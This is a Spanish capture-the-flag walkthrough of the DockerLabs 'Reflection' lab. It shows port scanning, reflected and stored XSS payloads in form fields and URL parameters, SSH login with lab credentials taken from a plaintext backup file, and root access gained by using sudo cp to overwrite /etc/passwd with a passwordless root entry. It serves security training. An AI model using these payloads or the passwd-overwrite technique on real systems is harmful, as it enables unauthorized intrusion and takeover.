---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Reflection DockerLabs (Easy)

### Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip reflection.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh reflection.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-27 07:43 EST
Nmap scan report for g00dj0b.reverse.dl (172.17.0.2)
Host is up (0.000037s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 89:6c:a5:af:d5:e2:83:6c:f9:87:33:44:0f:78:48:3a (ECDSA)
|_  256 65:32:42:95:ca:d0:53:bb:28:a5:15:4a:9c:14:64:5b (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Laboratorio de Cross-Site Scripting (XSS)
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.72 seconds
```

Si entramos en la pagina tendremos 4 retos que nos propone la pagina a nivel de hacking los cuales tendremos que completar para posteriormente conectarnos por `ssh`.

## Reto 1 (XSS Reflejado)

Si en el cuadro de texto ponemos lo siguiente:

```shell
<h1>XSS</h1>
```

Y le damos a enviar, veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vemos que podemos injectar codigo `HTML` y se refleja el resultado en el cuadro de texto, por lo que estaria completado el primer reto.

## Reto 2 (XSS Almacenado)

En el segundo reto es mas de lo mismo, solo que en este caso se quedan almacenados.

```
<div style="background-image: url(javascript:alert('XSS'))">
<h1>XSS</h1>
<p style="color:red;">COLOR_ROJO</p>
```

Y se veria algo asi:

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Por lo que pasaremos al reto `3`.

## Reto 3 (XSS con Dropdowns)

En este caso se puede hacer con `BurpSuite` para interceptar la peticion de `enviar` y modificar esa peticion para que el resultado ponga lo que nosotros queramos, pero si nosotros enviamos de primera vez la peticion, en la `URL` aparecera lo siguiente:

```
URL = http://<IP>/laboratorio3/?opcion1=ValorA&opcion2=ValorX&opcion3=Opcion2
```

Por lo que la modificaremos directamente en la `URL` poniendo por ejemplo lo siguiente:

```
URL = http://<IP>/laboratorio3/?opcion1=<h1>XSS</h1>&opcion2=<a style="color:blue;">MarioGuapo</a>&opcion3=<h3>HACKEADO!!</h3>
```

Y si le damos a `ENTER` veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Por lo que pasaremos al reto final.

## Reto 4 (XSS Basado en Parámetros GET)

En este caso como nos inidica, si ponemos el parametro `?data=` podremos realizar `XSS` y se reflejara en la pagina web, por lo que haremos lo siguiente:

```
URL = http://<IP>/laboratorio4/?data=<h1>XSS</h1>
```

Por lo que veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

O por ejemplo si ponemos...

```
URL = http://<IP>/laboratorio4/?data=<script>alert('XSS')</script>
```

Si lo enviamos, veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Por lo que habremos terminado los retos, ahora si le damos al siguiente boton llamado `Click aqui cuando hayas completado los laboratorios`, veremos lo siguiente.

## SSH

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Por lo que nos conectaremos por `ssh` con dichas credenciales.

```shell
ssh balu@<IP>
```

Metemos como contraseña `balulero`, echo esto ya estaremos dentro con dicho usuario.

## Escalate user balulito

Si listamos la raiz (`/`) veremos lo siguiente:

```shell
ls -la /
```

Info:

```
total 68
drwxr-xr-x   1 root root 4096 Dec 27 12:43 .
drwxr-xr-x   1 root root 4096 Dec 27 12:43 ..
-rwxr-xr-x   1 root root    0 Dec 27 12:43 .dockerenv
lrwxrwxrwx   1 root root    7 Dec 23 00:00 bin -> usr/bin
drwxr-xr-x   2 root root 4096 Oct 31 11:04 boot
drwxr-xr-x   5 root root  340 Dec 27 12:43 dev
drwxr-xr-x   1 root root 4096 Dec 27 12:43 etc
drwxr-xr-x   1 root root 4096 Dec 27 10:38 home
lrwxrwxrwx   1 root root    7 Dec 23 00:00 lib -> usr/lib
lrwxrwxrwx   1 root root    9 Dec 23 00:00 lib64 -> usr/lib64
drwxr-xr-x   2 root root 4096 Dec 23 00:00 media
drwxr-xr-x   2 root root 4096 Dec 23 00:00 mnt
drwxr-xr-x   2 root root 4096 Dec 23 00:00 opt
dr-xr-xr-x 364 root root    0 Dec 27 12:43 proc
drwx------   1 root root 4096 Dec 26 16:45 root
drwxr-xr-x   1 root root 4096 Dec 27 14:03 run
lrwxrwxrwx   1 root root    8 Dec 23 00:00 sbin -> usr/sbin
-rw-r--r--   1 balu balu   25 Dec 26 16:47 secret.bak
drwxr-xr-x   2 root root 4096 Dec 23 00:00 srv
dr-xr-xr-x  13 root root    0 Dec 27 12:43 sys
drwxrwxrwt   1 root root 4096 Dec 27 12:43 tmp
drwxr-xr-x   1 root root 4096 Dec 23 00:00 usr
drwxr-xr-x   1 root root 4096 Dec 25 10:28 var
```

Vemos un archivo interesante llamado `secret.bak`, si lo leemos veremos lo siguiente:

```shell
cat secret.bak
```

Info:

```
balulito:balulerochingon
```

Por lo que introduciremos dichas credenciales de la siguiente forma:

```shell
su balulito
```

Metemos como contraseña `balulerochingon` y seremos dicho usuario.

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for balulito on e3459b8d8277:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User balulito may run the following commands on e3459b8d8277:
    (ALL) NOPASSWD: /bin/cp
```

Por lo que vemos podemos ejecutar el binario `cp` como el usuario `root`, por lo que haremos lo siguiente para ser `root`:

Copiaremos todo el `passwd` y crearemos un `passwd_fake` en `tmp`:

```shell
nano /tmp/passwd_fake

#Dentro del nano
root::0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
balu:x:1000:1000:balu,,,:/home/balu:/bin/bash
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:102::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
balulito:x:1001:1001:balulito,,,:/home/balulito:/bin/bash
```

Le quitaremos la `x` a `root` para quitarle la contraseña.

Ahora haremos lo siguiente:

```shell
sudo cp /tmp/passwd_fake /etc/passwd
```

Y ahora si hacemos:

```shell
su root
```

Vemos que seremos `root` directamente sin meter contraseña, por lo que habremos terminado.
